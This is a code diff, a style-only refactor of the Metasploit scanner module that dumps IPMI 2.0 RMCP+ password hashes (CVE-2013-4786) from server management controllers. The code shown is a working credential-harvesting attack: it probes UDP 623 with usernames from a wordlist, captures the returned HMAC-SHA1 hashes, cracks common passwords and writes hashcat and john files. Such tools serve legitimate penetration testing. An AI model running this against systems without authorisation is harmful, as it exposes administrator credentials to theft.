@@ -1,14 +1,13 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 require 'rex/proto/ipmi'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
@@ -29,29 +28,26 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'http://seclists.org/bugtraq/2014/Apr/16'], # HP's SSRT101367
           ['CVE', '2013-4786'],
           ['OSVDB', '95057'],
-          ['BID', '61076'],
+          ['BID', '61076']
         ],
       'DisclosureDate' => 'Jun 20 2013'
     )
 
     register_options(
-    [
-      Opt::RPORT(623),
-      OptPath.new('USER_FILE', [ true, "File containing usernames, one per line",
-        File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_users.txt')
-      ]),
-      OptPath.new('PASS_FILE', [ true, "File containing common passwords for offline cracking, one per line",
-        File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_passwords.txt')
-      ]),
-      OptString.new('OUTPUT_HASHCAT_FILE', [false, "Save captured password hashes in hashcat format"]),
-      OptString.new('OUTPUT_JOHN_FILE', [false, "Save captured password hashes in john the ripper format"]),
-      OptBool.new('CRACK_COMMON', [true, "Automatically crack common passwords as they are obtained", true])
-    ], self.class)
-
+      [
+        Opt::RPORT(623),
+        OptPath.new('USER_FILE', [ true, "File containing usernames, one per line",
+                                   File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_users.txt')]),
+        OptPath.new('PASS_FILE', [ true, "File containing common passwords for offline cracking, one per line",
+                                   File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_passwords.txt')]),
+        OptString.new('OUTPUT_HASHCAT_FILE', [false, "Save captured password hashes in hashcat format"]),
+        OptString.new('OUTPUT_JOHN_FILE', [false, "Save captured password hashes in john the ripper format"]),
+        OptBool.new('CRACK_COMMON', [true, "Automatically crack common passwords as they are obtained", true])
+      ], self.class
+    )
   end
 
   def run_host(ip)
-
     vprint_status("#{ip}:#{rport} - IPMI - Sending IPMI probes")
 
     usernames = []
@@ -75,8 +71,8 @@ class MetasploitModule < Msf::Auxiliary
     passwords << ""
     passwords = passwords.uniq
 
-    self.udp_sock = Rex::Socket::Udp.create({'Context' => {'Msf' => framework, 'MsfExploit' => self}})
-    add_socket(self.udp_sock)
+    self.udp_sock = Rex::Socket::Udp.create('Context' => { 'Msf' => framework, 'MsfExploit' => self })
+    add_socket(udp_sock)
 
     reported_vuln = false
 
@@ -91,7 +87,6 @@ class MetasploitModule < Msf::Auxiliary
 
       # It may take multiple tries to get a working "session" on certain BMCs (HP iLO 4, etc)
       1.upto(5) do |attempt|
-
         r = nil
         1.upto(3) do
           udp_send(Rex::Proto::IPMI::Utils.create_ipmi_session_open_request(console_session_id))
@@ -139,7 +134,7 @@ class MetasploitModule < Msf::Auxiliary
         end
 
         if rakp.error_code != 0
-          vprint_error("#{rhost}:#{rport} - IPMI - Returned error code #{rakp.error_code} for username #{username}: #{Rex::Proto::IPMI::RMCP_ERRORS[rakp.error_code].to_s}")
+          vprint_error("#{rhost}:#{rport} - IPMI - Returned error code #{rakp.error_code} for username #{username}: #{Rex::Proto::IPMI::RMCP_ERRORS[rakp.error_code]}")
           rakp = nil
           break
         end
@@ -156,7 +151,7 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       # Skip to the next user if we didnt get a valid response
-      next if not rakp
+      next unless rakp
 
       # Calculate the salt used in the hmac-sha1 hash
       hmac_buffer = Rex::Proto::IPMI::Utils.create_rakp_hmac_sha1_salt(
@@ -188,13 +183,13 @@ class MetasploitModule < Msf::Auxiliary
       # Write the vulnerability to the database
       unless reported_vuln
         report_vuln(
-          :host  => rhost,
-          :port  => rport,
-          :proto => 'udp',
-          :sname => 'ipmi',
-          :name  => 'IPMI 2.0 RMCP+ Authentication Password Hash Exposure',
-          :info  => "Obtained password hash for user #{username}: #{sha1_salt}:#{sha1_hash}",
-          :refs  => self.references
+          host: rhost,
+          port: rport,
+          proto: 'udp',
+          sname: 'ipmi',
+          name: 'IPMI 2.0 RMCP+ Authentication Password Hash Exposure',
+          info: "Obtained password hash for user #{username}: #{sha1_salt}:#{sha1_hash}",
+          refs: references
         )
         reported_vuln = true
       end
@@ -204,7 +199,7 @@ class MetasploitModule < Msf::Auxiliary
 
       passwords.uniq.each do |pass|
         pass = pass.strip
-        next unless pass.length > 0
+        next if pass.empty?
         next unless Rex::Proto::IPMI::Utils.verify_rakp_hmac_sha1(hmac_buffer, rakp.hmac_sha1, pass)
         print_good("#{rhost}:#{rport} - IPMI - Hash for user '#{username}' matches password '#{pass}'")
 
@@ -215,22 +210,29 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def process_opensession_reply(data, shost, sport)
+  def process_opensession_reply(data, shost, _sport)
     shost = shost.sub(/^::ffff:/, '')
-    info = Rex::Proto::IPMI::Open_Session_Reply.new(data) rescue nil
-    return if not info
-    return if not info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RMCPPLUSOPEN_REP
+    info = begin
+             Rex::Proto::IPMI::Open_Session_Reply.new(data)
+           rescue
+             nil
+           end
+    return unless info
+    return unless info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RMCPPLUSOPEN_REP
     info
   end
 
-  def process_rakp1_reply(data, shost, sport)
+  def process_rakp1_reply(data, shost, _sport)
     shost = shost.sub(/^::ffff:/, '')
-    info = Rex::Proto::IPMI::RAKP2.new(data) rescue nil
-    return if not info
-    return if not info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RAKP2
+    info = begin
+             Rex::Proto::IPMI::RAKP2.new(data)
+           rescue
+             nil
+           end
+    return unless info
+    return unless info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RAKP2
     info
   end
-
 
   def write_output_files(rhost, username, sha1_salt, sha1_hash)
     if datastore['OUTPUT_HASHCAT_FILE']
@@ -260,12 +262,12 @@ class MetasploitModule < Msf::Auxiliary
 
   def report_hash(user, hash)
     credential_data = {
-      module_fullname: self.fullname,
+      module_fullname: fullname,
       origin_type: :service,
       private_data: hash,
       private_type: :nonreplayable_hash,
       jtr_format: 'rakp',
-      username: user,
+      username: user
     }.merge(service_data)
 
     login_data = {
@@ -297,7 +299,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       udp_sock.sendto(data, rhost, datastore['RPORT'], 0)
     rescue ::Interrupt
-      raise $!
+      raise $ERROR_INFO
     rescue ::Exception
     end
   end
